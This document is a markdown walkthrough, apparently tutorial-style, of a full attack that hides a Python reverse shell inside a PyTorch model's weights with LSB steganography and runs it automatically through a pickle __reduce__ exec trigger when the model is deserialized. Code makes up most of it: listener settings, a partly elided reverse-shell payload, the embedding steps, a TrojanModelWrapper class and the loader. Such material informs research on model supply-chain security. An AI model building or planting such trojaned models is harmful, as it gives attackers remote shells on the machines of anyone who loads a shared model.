````markdown
# The Attack: Embedding a Reverse Shell in a Model via Tensor Steganography

This section outlines a **complete attack pipeline** in which a reverse shell payload is hidden inside a neural network’s parameters using tensor steganography, and executed automatically during model deserialization.

---

## 1. Payload Definition

The attacker’s goal is to achieve **remote code execution** on a target machine that loads a compromised model. The chosen payload is a **Python reverse shell**, which connects back to a listener controlled by the attacker.

### Configuration

- `HOST_IP` – IP address of the listener machine, reachable from the target environment.
- `LISTENER_PORT` – TCP port the listener monitors.

```python
HOST_IP = "localhost"      # Replace with listener IP
LISTENER_PORT = 4444       # Port to connect back to listener
````

### Reverse Shell Logic

* Attempts a TCP connection to the attacker.
* Redirects the target’s standard input/output/error to the socket.
* Spawns an interactive shell (`/bin/bash` or environment default).
* Handles errors gracefully and exits forcibly after execution.

```python
payload_code_string = f"""
import socket, subprocess, os, pty, sys, traceback
...
pty.spawn([shell])  # Interactive shell
...
os._exit(1)
"""
```

* Payload is encoded into bytes for steganography:

```python
payload_bytes_to_hide = payload_code_string.encode("utf-8")
```

---

## 2. Embedding the Payload into the Model

The **payload bytes** are hidden inside the model’s parameters, specifically a large tensor suitable for LSB steganography.

### Steps

1. **Load Legitimate Model State**

```python
loaded_state_dict = torch.load("victim_model_state.pth")
```

2. **Select Carrier Tensor**

* `target_key = "large_layer.weight"`
* Tensor is large enough to embed payload without excessive distortion.

```python
original_target_tensor = loaded_state_dict[target_key]
```

3. **Capacity Check**

* Calculate **elements needed** based on payload size + 4-byte length prefix and number of LSBs (e.g., `NUM_LSB = 2`):

```python
bytes_to_embed = 4 + len(payload_bytes_to_hide)
elements_needed = (bytes_to_embed * 8 + NUM_LSB - 1) // NUM_LSB
if original_target_tensor.numel() < elements_needed:
    raise ValueError("Target tensor too small for payload")
```

4. **Encode Payload with LSB Steganography**

```python
modified_target_tensor = encode_lsb(original_target_tensor, payload_bytes_to_hide, NUM_LSB)
modified_state_dict = loaded_state_dict.copy()
modified_state_dict[target_key] = modified_target_tensor
```

* The resulting **modified_state_dict** now contains the hidden reverse shell.

---

## 3. Triggering Execution via Pickle

Python’s `pickle` module allows **arbitrary code execution** during deserialization using the `__reduce__` method. The attack exploits this feature.

### TrojanModelWrapper

A malicious wrapper class encapsulates:

* `modified_state_dict` – Contains the tensor with hidden payload.
* `target_key` – Name of the tensor storing the payload.
* `num_lsb` – Number of LSBs used.

```python
class TrojanModelWrapper:
    def __init__(self, modified_state_dict: dict, target_key: str, num_lsb: int):
        self.pickled_state_dict_bytes = pickle.dumps(modified_state_dict)
        self.target_key = target_key
        self.num_lsb = num_lsb
```

---

## 4. Payload Execution via `__reduce__`

`__reduce__` replaces the standard unpickling process with an **arbitrary execution vector**:

1. Constructs a **loader code string** containing:

   * `decode_lsb` function for extracting hidden bytes from the tensor.
   * Pickled state_dict and embedding metadata.
   * Code to reconstruct the tensor, decode payload, and execute it.

2. Returns a tuple `(exec, (loader_code,))` so that **unpickling executes the loader**.

```python
def __reduce__(self):
    loader_code = f"""
    import pickle, torch, struct, traceback, os, pty, socket, sys, subprocess
    {decode_lsb_source}
    reconstructed_state_dict = pickle.loads(pickled_state_dict_bytes)
    payload_tensor = reconstructed_state_dict[target_key]
    extracted_payload_bytes = decode_lsb(payload_tensor, num_lsb)
    extracted_payload_code = extracted_payload_bytes.decode('utf-8', errors='replace')
    exec(extracted_payload_code, globals(), locals())
    """
    return (exec, (loader_code,))
```

* On deserialization:

  1. The loader reconstructs the state_dict.
  2. Extracts the payload from `large_layer.weight`.
  3. Decodes it from LSBs.
  4. Executes the reverse shell automatically.

---

## 5. Key Characteristics of the Attack

* **Self-contained**: Data, decoding function, and trigger are embedded in one pickled file.
* **Stealthy**: Minimal modifications to model parameters; LSB embedding avoids detection.
* **Automated**: Execution is triggered during normal model deserialization.
* **Flexible**: Can embed arbitrary Python code, not limited to reverse shells.
* **Payload Recovery**: Relies entirely on `decode_lsb` logic to extract hidden bytes reliably.

---

## 6. Attack Flow Summary

```text
[Define Payload] --> [Encode to Bytes] --> [Select Carrier Tensor] --> [Embed with encode_lsb]
      |
      v
[Wrap in TrojanModelWrapper] --> [Pickle Wrapper with __reduce__]
      |
      v
[Target Loads Model] --> [Pickle Unpickling Triggers __reduce__] --> [Loader Decodes Payload]
      |
      v
[Executes Reverse Shell on Target]
```

* Entire attack demonstrates **how a neural network model can serve as a trojan delivery mechanism** with a hidden, executable payload embedded in tensor weights.

```
```
